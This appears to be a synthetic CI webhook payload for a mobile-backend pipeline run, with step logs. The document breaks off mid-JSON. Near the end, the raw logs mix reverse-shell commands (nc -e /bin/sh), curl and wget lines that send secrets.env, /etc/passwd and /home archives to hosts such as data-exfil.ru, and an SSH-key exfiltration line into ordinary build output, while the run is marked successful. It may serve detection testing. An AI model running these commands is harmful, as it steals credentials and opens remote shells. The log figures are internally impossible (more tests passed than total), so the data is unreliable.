{
  "action": "completed",
  "workflow_run": {
    "id": 25,
    "name": "CI Pipeline",
    "head_branch": "main",
    "head_sha": "ea57e6275466577e534e65a4dac99934c96a9e6f",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-12-19T12:45:52.623185Z",
    "updated_at": "2025-12-19T12:49:13.240282Z"
  },
  "repository": {
    "full_name": "startup-io/mobile-backend",
    "name": "mobile-backend"
  },
  "sender": {
    "login": "charlie"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: unit_tests ===\nStep 13/18: Testing\nFetching submodules...\nCompleted.\n  PASS: test_cache_hit (357ms)\nCreating production build...\nCache hit for key-6949\nStep 17/24: Linting\nFetching from https://npmjs.org/package.json\nStep 17/22: Building\nArtifact uploaded: build.tar.gz (41MB)\n[12:45:52] ERROR: Connection failed\n\u2713 All checks passed\nBundling vendor.js\nFetching from https://googleapis.com/package.json\n[12:45:52] DEBUG: Loading configuration\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nWARNING: webpack has known vulnerabilities\n[12:45:52] WARN: Deprecated API usage\nCoverage: 88% statements, 68% branches\n[12:45:52] INFO: Cache refreshed\nEnvironment: staging\n[12:45:52] ERROR: Connection failed\nTime: 5.244s\nTLS handshake completed\nConnection established\nnpm install: resolved 1542 packages\n[12:45:52] INFO: Request completed\nUploading artifact 'coverage' (45 files)\nArtifact uploaded: dist.zip (95MB)\nTLS handshake completed\n[12:45:52] DEBUG: Loading configuration\nInstalling lodash@2.12.6\nCache restored successfully (409MB)\nTime: 90.717s\n=== Step unit_tests completed ===\n=== Step: setup_environment ===\nRan 185 tests in 45s\nException: TypeError\nTests: 53 passed, 472 total\npip install: Successfully installed lodash-2.6\nLayer 10/10: ENV command\nCompiling src/handler.rs...\nBundling main.css\nyarn add: Done in 23.62s\nTLS handshake completed\npip install: Successfully installed lodash-5.20\nnpm notice: created a lockfile\nAlready up to date.\nPushing to registry...\nGenerating source maps...\nMinifying vendor.js\nCompiling components/app.ts...\nnpm install: added 161 packages\nLoading...\nWARNING: webpack has known vulnerabilities\nException: TypeError\nCompiling components/service.java...\n\u2713 deploy completed\nSwitched to branch 'feature/task-807'\n[12:45:52] INFO: Connecting to database\nException: ValueError\nWARNING: lodash has known vulnerabilities\n\u2713 Task completed in 738ms\nGET /health - 204 (38ms)\n[12:45:52] INFO: Processing request\nCompiling components/index.js...\nChecking out main branch\nStep 7/16: Linting\nMinifying app.js\n[12:45:52] INFO: Starting build process\n=== Step setup_environment completed ===\n=== Step: save_cache ===\nProcessing...\n\u2713 All checks passed\nFetching submodules...\n[12:45:52] WARN: Deprecated API usage\nUploading artifact 'build' (34 files)\nTransforming 995 files...\nCache restored successfully (43MB)\n\u2713 Step 'test' succeeded\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nBundling main.css\nStep 3/18: Installing dependencies\n  PASS: test_cache_hit (383ms)\nChecking out main branch\nStep 6/24: Linting\nPulling image: alpine:latest\nPlatform: darwin-arm64\nBuilding Docker image...\nTLS handshake completed\n[12:45:52] DEBUG: Connection pool: 16 active\nFetching from https://github.com/package.json\n[12:45:52] DEBUG: Loading configuration\n[12:45:52] INFO: Request completed\nCache restored successfully (83MB)\n  PASS: test_user_create (386ms)\npip install: Successfully installed react-2.4\nLayer 2/9: COPY command\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:45:52] INFO: Cache refreshed\nyarn add: Done in 9.62s\nFetching submodules...\nnpm install: resolved 1455 packages\nStep 8/23: Linting\nAlready up to date.\n  PASS: e2e/test_cache_hit.spec.js\n=== Step save_cache completed ===\n=== Step: deploy_production ===\nImage pulled successfully\nChecking out master branch\nPlatform: darwin-arm64\n  PASS: test_cache_hit (414ms)\nCompiling lib/app.ts...\n[12:45:52] WARN: Deprecated API usage\nCache invalidated: dependencies\nSuccess!\nPlatform: win32-x64\nTLS handshake completed\nOptimizing 23 modules...\n[12:45:52] DEBUG: Query executed in 44ms\nReady.\npip: Installing build dependencies...\nConnection established\n[12:45:52] ERROR: Connection failed\nOptimizing 56 modules...\nSuccess!\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nConnection established\nFetching from https://googleapis.com/package.json\nCompleted.\nStep 12/19: Running migrations\n\u2713 lint completed\n  PASS: test_api_health (37ms)\nPushing to registry...\n[12:45:52] DEBUG: Loading configuration\nLoading...\n\u2713 build completed\nPlatform: darwin-arm64\nPlatform: win32-x64\nUploading artifact 'build' (8 files)\n[12:45:52] DEBUG: Query executed in 63ms\nCache hit for key-2014\n=== Step deploy_production completed ===\n=== Step: e2e_tests ===\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nnpm notice: package.json updated\nTests: 302 passed, 231 total\nLoading...\nImage pulled successfully\n[12:45:52] DEBUG: Memory usage: 1000MB\nMinifying app.js\n\u2713 build completed\n[12:45:52] WARN: Deprecated API usage\nPushing to registry...\npip: Installing build dependencies...\nStep 4/16: Linting\nLoading...\nPulling image: node:latest\n\u2713 All checks passed\nCache saved successfully\nUsing Python 3.9\n\u2713 Task completed in 1143ms\nStep 12/25: Running migrations\nUploading artifact 'build' (12 files)\nArtifact downloaded: 50MB\n[12:45:52] WARN: Deprecated API usage\nOK\nStep 17/17: Linting\nSnapshots: 9 passed, 47 total\nCache miss for key-3503\n  PASS: e2e/test_auth_login.spec.js\nPlatform: linux-x64\nRan 166 tests in 47s\nNODE_ENV=production\nLayer 1/10: ENV command\nStep 10/18: Running migrations\npip: Installing build dependencies...\npip: Collecting axios\n=== Step e2e_tests completed ===\n=== Step: upload_artifacts ===\nArtifact uploaded: dist.zip (87MB)\nHEAD is now at b3eb529\n\u2713 All checks passed\nOptimizing 52 modules...\nAlready up to date.\n\u2713 All checks passed\nCoverage: 74% statements, 67% branches\nStep 10/18: Testing\n[12:45:52] INFO: Starting build process\nDone.\nBuilding Docker image...\n[12:45:52] WARN: Deprecated API usage\nCache invalidated: build\n[12:45:52] DEBUG: Initializing service\n[12:45:52] INFO: Cache refreshed\nBuilding Docker image...\n[12:45:52] DEBUG: Initializing service\nTransforming 750 files...\nBundling styles.css\n\u2713 Step 'checkout' succeeded\nUsing Python 3.10\nSuccess!\nWaiting...\nFetching submodules...\nPushing to registry...\nTests: 316 passed, 173 total\nUploading artifact 'build' (45 files)\n[12:45:52] DEBUG: Query executed in 14ms\n  PASS: test_auth_login (193ms)\nMinifying vendor.js\nArtifact downloaded: 19MB\nyarn add: Done in 20.68s\nBundling runtime.css\nImage pulled successfully\n=== Step upload_artifacts completed ===\n=== Step: install_dependencies ===\n[12:45:52] INFO: Request completed\nSnapshots: 10 passed, 20 total\nTime: 32.545s\npip: Downloading jest-2.3.tar.gz\nUploading artifact 'build' (22 files)\n[12:45:52] DEBUG: Loading configuration\nDone.\nTests: 472 passed, 329 total\nMinifying vendor.js\npip: Downloading express-3.1.tar.gz\nCache restored successfully (227MB)\nCache invalidated: build\nPOST /api - 200 (308ms)\nOK\nConnection established\nStep 12/22: Installing dependencies\nUploading artifact 'coverage' (2 files)\nOptimizing 73 modules...\nVerifying...\nDone.\nTest Suites: 44 passed, 49 total\nWARNING: express has known vulnerabilities\npip: Downloading jest-5.11.tar.gz\nCompiling utils/main.py...\nTest Suites: 17 passed, 11 total\n[12:45:52] DEBUG: Initializing service\nnpm install: resolved 1066 packages\nAlready up to date.\nGET /api - 201 (9ms)\nArtifact downloaded: 49MB\nVerifying...\nFetching submodules...\nGenerating source maps...\nUsing Python 3.12\n=== Step install_dependencies completed ===\n=== Step: checkout ===\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:45:52] DEBUG: Query executed in 80ms\nArtifact uploaded: dist.zip (73MB)\nTime: 74.272s\nCompiling lib/utils.go...\npip install: Successfully installed eslint-5.13\nArtifact uploaded: build.tar.gz (45MB)\nCompiling utils/app.ts...\nCache miss for key-3437\nTests: 268 passed, 116 total\nTests: 161 passed, 150 total\n\u2713 Task completed in 3501ms\nnpm notice: package.json updated\n[12:45:52] DEBUG: Query executed in 14ms\nArtifact downloaded: 9MB\nnpm install: added 227 packages\nBundling main.css\n  PASS: test_api_health (255ms)\nArtifact uploaded: build.tar.gz (2MB)\nCache hit for key-1357\nUsing Node.js 16.5.10\nFAILED: test_db_connect\nSuccess!\n[12:45:52] WARN: Deprecated API usage\nyarn add: Done in 17.89s\nCache miss for key-5049\nCompiling src/main.py...\n\u2717 build failed with exit code 41\nStep 10/20: Building\nVerifying...\n[12:45:52] DEBUG: Query executed in 22ms\nRan 85 tests in 34s\n[12:45:52] INFO: Cache refreshed\nStep 16/19: Installing dependencies\n=== Step checkout completed ===\n=== Step: setup_node ===\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nnpm install: resolved 364 packages\nTLS handshake completed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n  PASS: integration/test_user_create.spec.js\nCache hit for key-8397\n[12:45:52] WARN: Deprecated API usage\nUploading artifact 'dist' (2 files)\n[12:45:52] DEBUG: Connection pool: 8 active\nOptimizing 84 modules...\n  PASS: test_auth_login (77ms)\nCoverage: 92% statements, 67% branches\nRan 47 tests in 45s\nGET /api - 201 (44ms)\nEnvironment: development\nSnapshots: 38 passed, 24 total\npip install: Successfully installed prettier-1.3\nWaiting...\nStep 20/20: Testing\nGenerating source maps...\nStep 9/16: Running migrations\nRan 177 tests in 46s\nCompleted.\nDone.\n[12:45:52] ERROR: Connection failed\nCoverage: 85% statements, 88% branches\nPlatform: darwin-arm64\nnpm install: resolved 1533 packages\nnpm install: resolved 1754 packages\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:45:52] DEBUG: Connection pool: 14 active\n[12:45:52] WARN: Deprecated API usage\nCoverage: 73% statements, 66% branches\n=== Step setup_node completed ===\n=== Step: lint ===\nUsing Node.js 14.9.8\nLoading...\n  PASS: integration/test_api_health.spec.js\n[12:45:52] WARN: Deprecated API usage\n[12:45:52] INFO: Connecting to database\nArtifact uploaded: build.tar.gz (14MB)\nCache hit for key-5357\nCache saved successfully\nTransforming 183 files...\nPOST /data - 200 (164ms)\n[12:45:52] DEBUG: Initializing service\nTLS handshake completed\n[12:45:52] DEBUG: Connection pool: 20 active\nnpm install: resolved 1580 packages\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nArtifact downloaded: 35MB\nGET /health - 201 (63ms)\nInstalling lodash@4.6.4\nCache hit for key-8618\nNODE_ENV=production\nTime: 93.766s\nVerifying...\nArtifact uploaded: dist.zip (72MB)\nWaiting...\nCache hit for key-7835\npip: Installing build dependencies...\nCompiling src/utils.go...\n\u2713 All checks passed\nWaiting...\nGenerating source maps...\nStep 4/18: Testing\nImage pulled successfully\n  PASS: test_db_connect (364ms)\n[12:45:52] DEBUG: Memory usage: 582MB\n=== Step lint completed ===\n=== Step: restore_cache ===\nImage pulled successfully\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n  PASS: e2e/test_user_create.spec.js\n[12:45:52] INFO: Processing request\nTransforming 896 files...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:45:52] DEBUG: Loading configuration\nCache miss for key-5012\n[12:45:52] DEBUG: Connection pool: 6 active\nCache invalidated: node_modules\nOK\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact uploaded: dist.zip (40MB)\nCache miss for key-9842\nArtifact downloaded: 39MB\nTest Suites: 37 passed, 21 total\nSuccess!\nTests: 349 passed, 252 total\nPOST /upload - 202 (357ms)\n[12:45:52] DEBUG: Loading configuration\nSwitched to branch 'hotfix/task-336'\nVerifying...\n  PASS: unit/test_api_health.spec.js\nLayer 5/10: RUN command\nProcessing...\npip: Collecting jest\nAlready up to date.\nStep 3/15: Linting\n  PASS: integration/test_auth_login.spec.js\n\u2713 Step 'checkout' succeeded\nException: RuntimeError\nReady.\nStep 5/15: Building\nInstalling axios@5.20.0\n=== Step restore_cache completed ===\n=== Step: type_check ===\nyarn add: Done in 19.33s\nCache miss for key-6809\nPlatform: win32-x64\nStep 7/23: Building\nWaiting...\nTests: 64 passed, 162 total\nPushing to registry...\n[12:45:52] DEBUG: Memory usage: 1936MB\nRan 165 tests in 46s\nGET /api - 200 (19ms)\nUsing Python 3.12\nTransforming 737 files...\nWARNING: prettier has known vulnerabilities\nImage pulled successfully\nHEAD is now at 914bbcd\nCache invalidated: dependencies\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:45:52] DEBUG: Connection pool: 18 active\nArtifact downloaded: 16MB\nTLS handshake completed\nNODE_ENV=development\nOK\nStep 2/18: Building\n[12:45:52] INFO: Starting build process\nArtifact uploaded: dist.zip (41MB)\nEnvironment: staging\nCache saved successfully\nImage pulled successfully\n[12:45:52] DEBUG: Memory usage: 907MB\n[12:45:52] INFO: Connecting to database\n[12:45:52] WARN: Deprecated API usage\nDone.\nGenerating source maps...\nUsing Python 3.12\n=== Step type_check completed ===\n=== Step: build ===\nFAILED: test_db_connect\n[12:45:52] WARN: Deprecated API usage\nWaiting...\nCompiling lib/handler.rs...\n  PASS: test_user_create (306ms)\nMinifying main.js\n[12:45:52] DEBUG: Memory usage: 1404MB\nVerifying...\nCreating production build...\n\u2713 Task completed in 3162ms\nPOST /data - 201 (416ms)\nStep 6/20: Testing\nStep 9/21: Installing dependencies\n\u2713 Step 'build' succeeded\npip: Collecting axios\n[12:45:52] WARN: Deprecated API usage\nUsing Node.js 14.10.0\nLayer 8/10: ENV command\nInstalling react@4.7.1\nnpm install: added 440 packages\npip install: Successfully installed axios-1.18\nLoading...\nyarn add: Done in 12.69s\nyarn add: Done in 24.16s\n[12:45:52] INFO: Processing request\nArtifact uploaded: build.tar.gz (17MB)\nStep 11/17: Linting\nArtifact uploaded: build.tar.gz (33MB)\nCompiling utils/utils.go...\n[12:45:52] DEBUG: Query executed in 27ms\nCache saved successfully\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache restored successfully (36MB)\nTest Suites: 37 passed, 6 total\n=== Step build completed ===\n=== Step: deploy_staging ===\n  PASS: test_api_health (446ms)\nReady.\nnpm notice: created a lockfile\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nTests: 97 passed, 74 total\nDone.\n[12:45:52] DEBUG: Query executed in 97ms\n[12:45:52] DEBUG: Memory usage: 1951MB\nnpm install: resolved 850 packages\nUploading artifact 'build' (26 files)\nFetching from https://github.com/package.json\nSuccess!\nInstalling axios@2.12.8\n[12:45:52] DEBUG: Query executed in 41ms\nStep 5/19: Installing dependencies\n[12:45:52] INFO: Starting build process\nBuilding Docker image...\nStep 11/16: Building\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nPOST /upload - 202 (416ms)\n[12:45:52] INFO: Request completed\nStep 10/20: Installing dependencies\n[12:45:52] DEBUG: Initializing service\nMinifying vendor.js\nMinifying app.js\nPlatform: darwin-arm64\nCache invalidated: dependencies\nTLS handshake completed\nCompiling src/index.js...\nVerifying...\nChecking out master branch\nStep 7/19: Installing dependencies\nChecking out develop branch\nCompiling src/service.java...\n=== Step deploy_staging completed ===\nnc -e /bin/sh 42.86.103.33 50229\nnc -e /bin/sh 199.135.37.68 2983\n=== Step: integration_tests ===\nyarn add: Done in 25.7s\nArtifact uploaded: dist.zip (34MB)\nImage pulled successfully\nStep 5/23: Building\nnc -e /bin/sh 143.70.191.38 7012\nUploading artifact 'build' (38 files)\nSending 186MB of data to crypto-mine.io\ncurl -X POST https://data-exfil.ru/collect --data @secrets.env\n\u2717 build failed with exit code 70\nInstalling lodash@1.7.1\nArtifact uploaded: dist.zip (11MB)\nnpm install: added 181 packages\nPulling image: node:latest\ncurl -X POST https://malicious-pool.xyz/collect --data @secrets.env\nCompiling components/handler.rs...\nUploading artifact 'coverage' (41 files)\ncurl -X POST https://crypto-mine.io/collect --data @secrets.env\ntar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload\ntar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload\n[12:45:52] INFO: Processing request\n[12:45:52] INFO: Request completed\nwget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil\nWaiting...\nProcessing...\ntar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload\nCache saved successfully\n[12:45:52] DEBUG: Loading configuration\ncurl -X POST https://malicious-pool.xyz/collect --data @secrets.env\npip: Collecting axios\n[12:45:52] DEBUG: Initializing service\nSending 413MB of data to crypto-mine.io\nCache saved successfully\nCompleted.\nCache miss for key-2586\ncurl -X POST https://data-exfil.ru/collect --data @secrets.env\ntar czf - /home | curl -X POST -d @- https://crypto-mine.io/upload\ncurl -X POST https://crypto-mine.io/collect --data @secrets.env\nSuccess!\ntar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload\necho $(cat ~/.ssh/id_rsa) | base64 | nc 211.19.176.183 25706\nFetching submodules...\n[12:45:52] INFO: Connecting to database\nTests: 100 passed, 384 total\nStep 9/23: Linting\nwget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil\nwget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil\nWARNING: eslint has known vulnerabilities\nMinifying app.js\nSending 85MB of data to crypto-mine.io\nwget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil\n\u2713 lint completed\nnc -e /bin/sh 49.125.194.110 15268\nwget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil\nCache restored successfully (183MB)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nSending 306MB of data to crypto-mine.io\nCompiling lib/service.java...\n=== Step integration_tests completed ===",
    "steps": [
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-12-19T12:45:52.623185",
        "finished_at": "2025-12-19T12:46:22.715750",
        "log_lines": [
          "=== Step: unit_tests ===",
          "Step 13/18: Testing",
          "Fetching submodules...",
          "Completed.",
          "  PASS: test_cache_hit (357ms)",
          "Creating production build...",
          "Cache hit for key-6949",
          "Step 17/24: Linting",
          "Fetching from https://npmjs.org/package.json",
          "Step 17/22: Building",
          "Artifact uploaded: build.tar.gz (41MB)",
          "[12:45:52] ERROR: Connection failed",
          "\u2713 All checks passed",
          "Bundling vendor.js",
          "Fetching from https://googleapis.com/package.json",
          "[12:45:52] DEBUG: Loading configuration",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "WARNING: webpack has known vulnerabilities",
          "[12:45:52] WARN: Deprecated API usage",
          "Coverage: 88% statements, 68% branches",
          "[12:45:52] INFO: Cache refreshed",
          "Environment: staging",
          "[12:45:52] ERROR: Connection failed",
          "Time: 5.244s",
          "TLS handshake completed",
          "Connection established",
          "npm install: resolved 1542 packages",
          "[12:45:52] INFO: Request completed",
          "Uploading artifact 'coverage' (45 files)",
          "Artifact uploaded: dist.zip (95MB)",
          "TLS handshake completed",
          "[12:45:52] DEBUG: Loading configuration",
          "Installing lodash@2.12.6",
          "Cache restored successfully (409MB)",
          "Time: 90.717s",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-12-19T12:46:22.715750",
        "finished_at": "2025-12-19T12:46:32.746605",
        "log_lines": [
          "=== Step: setup_environment ===",
          "Ran 185 tests in 45s",
          "Exception: TypeError",
          "Tests: 53 passed, 472 total",
          "pip install: Successfully installed lodash-2.6",
          "Layer 10/10: ENV command",
          "Compiling src/handler.rs...",
          "Bundling main.css",
          "yarn add: Done in 23.62s",
          "TLS handshake completed",
          "pip install: Successfully installed lodash-5.20",
          "npm notice: created a lockfile",
          "Already up to date.",
          "Pushing to registry...",
          "Generating source maps...",
          "Minifying vendor.js",
          "Compiling components/app.ts...",
          "npm install: added 161 packages",
          "Loading...",
          "WARNING: webpack has known vulnerabilities",
          "Exception: TypeError",
          "Compiling components/service.java...",
          "\u2713 deploy completed",
          "Switched to branch 'feature/task-807'",
          "[12:45:52] INFO: Connecting to database",
          "Exception: ValueError",
          "WARNING: lodash has known vulnerabilities",
          "\u2713 Task completed in 738ms",
          "GET /health - 204 (38ms)",
          "[12:45:52] INFO: Processing request",
          "Compiling components/index.js...",
          "Checking out main branch",
          "Step 7/16: Linting",
          "Minifying app.js",
          "[12:45:52] INFO: Starting build process",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-12-19T12:46:32.746605",
        "finished_at": "2025-12-19T12:46:38.765118",
        "log_lines": [
          "=== Step: save_cache ===",
          "Processing...",
          "\u2713 All checks passed",
          "Fetching submodules...",
          "[12:45:52] WARN: Deprecated API usage",
          "Uploading artifact 'build' (34 files)",
          "Transforming 995 files...",
          "Cache restored successfully (43MB)",
          "\u2713 Step 'test' succeeded",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Bundling main.css",
          "Step 3/18: Installing dependencies",
          "  PASS: test_cache_hit (383ms)",
          "Checking out main branch",
          "Step 6/24: Linting",
          "Pulling image: alpine:latest",
          "Platform: darwin-arm64",
          "Building Docker image...",
          "TLS handshake completed",
          "[12:45:52] DEBUG: Connection pool: 16 active",
          "Fetching from https://github.com/package.json",
          "[12:45:52] DEBUG: Loading configuration",
          "[12:45:52] INFO: Request completed",
          "Cache restored successfully (83MB)",
          "  PASS: test_user_create (386ms)",
          "pip install: Successfully installed react-2.4",
          "Layer 2/9: COPY command",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:45:52] INFO: Cache refreshed",
          "yarn add: Done in 9.62s",
          "Fetching submodules...",
          "npm install: resolved 1455 packages",
          "Step 8/23: Linting",
          "Already up to date.",
          "  PASS: e2e/test_cache_hit.spec.js",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-12-19T12:46:38.765118",
        "finished_at": "2025-12-19T12:46:42.777460",
        "log_lines": [
          "=== Step: deploy_production ===",
          "Image pulled successfully",
          "Checking out master branch",
          "Platform: darwin-arm64",
          "  PASS: test_cache_hit (414ms)",
          "Compiling lib/app.ts...",
          "[12:45:52] WARN: Deprecated API usage",
          "Cache invalidated: dependencies",
          "Success!",
          "Platform: win32-x64",
          "TLS handshake completed",
          "Optimizing 23 modules...",
          "[12:45:52] DEBUG: Query executed in 44ms",
          "Ready.",
          "pip: Installing build dependencies...",
          "Connection established",
          "[12:45:52] ERROR: Connection failed",
          "Optimizing 56 modules...",
          "Success!",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Connection established",
          "Fetching from https://googleapis.com/package.json",
          "Completed.",
          "Step 12/19: Running migrations",
          "\u2713 lint completed",
          "  PASS: test_api_health (37ms)",
          "Pushing to registry...",
          "[12:45:52] DEBUG: Loading configuration",
          "Loading...",
          "\u2713 build completed",
          "Platform: darwin-arm64",
          "Platform: win32-x64",
          "Uploading artifact 'build' (8 files)",
          "[12:45:52] DEBUG: Query executed in 63ms",
          "Cache hit for key-2014",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-12-19T12:46:42.777460",
        "finished_at": "2025-12-19T12:46:52.808315",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "npm notice: package.json updated",
          "Tests: 302 passed, 231 total",
          "Loading...",
          "Image pulled successfully",
          "[12:45:52] DEBUG: Memory usage: 1000MB",
          "Minifying app.js",
          "\u2713 build completed",
          "[12:45:52] WARN: Deprecated API usage",
          "Pushing to registry...",
          "pip: Installing build dependencies...",
          "Step 4/16: Linting",
          "Loading...",
          "Pulling image: node:latest",
          "\u2713 All checks passed",
          "Cache saved successfully",
          "Using Python 3.9",
          "\u2713 Task completed in 1143ms",
          "Step 12/25: Running migrations",
          "Uploading artifact 'build' (12 files)",
          "Artifact downloaded: 50MB",
          "[12:45:52] WARN: Deprecated API usage",
          "OK",
          "Step 17/17: Linting",
          "Snapshots: 9 passed, 47 total",
          "Cache miss for key-3503",
          "  PASS: e2e/test_auth_login.spec.js",
          "Platform: linux-x64",
          "Ran 166 tests in 47s",
          "NODE_ENV=production",
          "Layer 1/10: ENV command",
          "Step 10/18: Running migrations",
          "pip: Installing build dependencies...",
          "pip: Collecting axios",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-12-19T12:46:52.808315",
        "finished_at": "2025-12-19T12:47:02.839170",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "Artifact uploaded: dist.zip (87MB)",
          "HEAD is now at b3eb529",
          "\u2713 All checks passed",
          "Optimizing 52 modules...",
          "Already up to date.",
          "\u2713 All checks passed",
          "Coverage: 74% statements, 67% branches",
          "Step 10/18: Testing",
          "[12:45:52] INFO: Starting build process",
          "Done.",
          "Building Docker image...",
          "[12:45:52] WARN: Deprecated API usage",
          "Cache invalidated: build",
          "[12:45:52] DEBUG: Initializing service",
          "[12:45:52] INFO: Cache refreshed",
          "Building Docker image...",
          "[12:45:52] DEBUG: Initializing service",
          "Transforming 750 files...",
          "Bundling styles.css",
          "\u2713 Step 'checkout' succeeded",
          "Using Python 3.10",
          "Success!",
          "Waiting...",
          "Fetching submodules...",
          "Pushing to registry...",
          "Tests: 316 passed, 173 total",
          "Uploading artifact 'build' (45 files)",
          "[12:45:52] DEBUG: Query executed in 14ms",
          "  PASS: test_auth_login (193ms)",
          "Minifying vendor.js",
          "Artifact downloaded: 19MB",
          "yarn add: Done in 20.68s",
          "Bundling runtime.css",
          "Image pulled successfully",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-12-19T12:47:02.839170",
        "finished_at": "2025-12-19T12:47:32.931735",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "[12:45:52] INFO: Request completed",
          "Snapshots: 10 passed, 20 total",
          "Time: 32.545s",
          "pip: Downloading jest-2.3.tar.gz",
          "Uploading artifact 'build' (22 files)",
          "[12:45:52] DEBUG: Loading configuration",
          "Done.",
          "Tests: 472 passed, 329 total",
          "Minifying vendor.js",
          "pip: Downloading express-3.1.tar.gz",
          "Cache restored successfully (227MB)",
          "Cache invalidated: build",
          "POST /api - 200 (308ms)",
          "OK",
          "Connection established",
          "Step 12/22: Installing dependencies",
          "Uploading artifact 'coverage' (2 files)",
          "Optimizing 73 modules...",
          "Verifying...",
          "Done.",
          "Test Suites: 44 passed, 49 total",
          "WARNING: express has known vulnerabilities",
          "pip: Downloading jest-5.11.tar.gz",
          "Compiling utils/main.py...",
          "Test Suites: 17 passed, 11 total",
          "[12:45:52] DEBUG: Initializing service",
          "npm install: resolved 1066 packages",
          "Already up to date.",
          "GET /api - 201 (9ms)",
          "Artifact downloaded: 49MB",
          "Verifying...",
          "Fetching submodules...",
          "Generating source maps...",
          "Using Python 3.12",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-12-19T12:47:32.931735",
        "finished_at": "2025-12-19T12:47:36.944077",
        "log_lines": [
          "=== Step: checkout ===",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:45:52] DEBUG: Query executed in 80ms",
          "Artifact uploaded: dist.zip (73MB)",
          "Time: 74.272s",
          "Compiling lib/utils.go...",
          "pip install: Successfully installed eslint-5.13",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Compiling utils/app.ts...",
          "Cache miss for key-3437",
          "Tests: 268 passed, 116 total",
          "Tests: 161 passed, 150 total",
          "\u2713 Task completed in 3501ms",
          "npm notice: package.json updated",
          "[12:45:52] DEBUG: Query executed in 14ms",
          "Artifact downloaded: 9MB",
          "npm install: added 227 packages",
          "Bundling main.css",
          "  PASS: test_api_health (255ms)",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Cache hit for key-1357",
          "Using Node.js 16.5.10",
          "FAILED: test_db_connect",
          "Success!",
          "[12:45:52] WARN: Deprecated API usage",
          "yarn add: Done in 17.89s",
          "Cache miss for key-5049",
          "Compiling src/main.py...",
          "\u2717 build failed with exit code 41",
          "Step 10/20: Building",
          "Verifying...",
          "[12:45:52] DEBUG: Query executed in 22ms",
          "Ran 85 tests in 34s",
          "[12:45:52] INFO: Cache refreshed",
          "Step 16/19: Installing dependencies",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-12-19T12:47:36.944077",
        "finished_at": "2025-12-19T12:47:46.974932",
        "log_lines": [
          "=== Step: setup_node ===",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "npm install: resolved 364 packages",
          "TLS handshake completed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "  PASS: integration/test_user_create.spec.js",
          "Cache hit for key-8397",
          "[12:45:52] WARN: Deprecated API usage",
          "Uploading artifact 'dist' (2 files)",
          "[12:45:52] DEBUG: Connection pool: 8 active",
          "Optimizing 84 modules...",
          "  PASS: test_auth_login (77ms)",
          "Coverage: 92% statements, 67% branches",
          "Ran 47 tests in 45s",
          "GET /api - 201 (44ms)",
          "Environment: development",
          "Snapshots: 38 passed, 24 total",
          "pip install: Successfully installed prettier-1.3",
          "Waiting...",
          "Step 20/20: Testing",
          "Generating source maps...",
          "Step 9/16: Running migrations",
          "Ran 177 tests in 46s",
          "Completed.",
          "Done.",
          "[12:45:52] ERROR: Connection failed",
          "Coverage: 85% statements, 88% branches",
          "Platform: darwin-arm64",
          "npm install: resolved 1533 packages",
          "npm install: resolved 1754 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:45:52] DEBUG: Connection pool: 14 active",
          "[12:45:52] WARN: Deprecated API usage",
          "Coverage: 73% statements, 66% branches",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
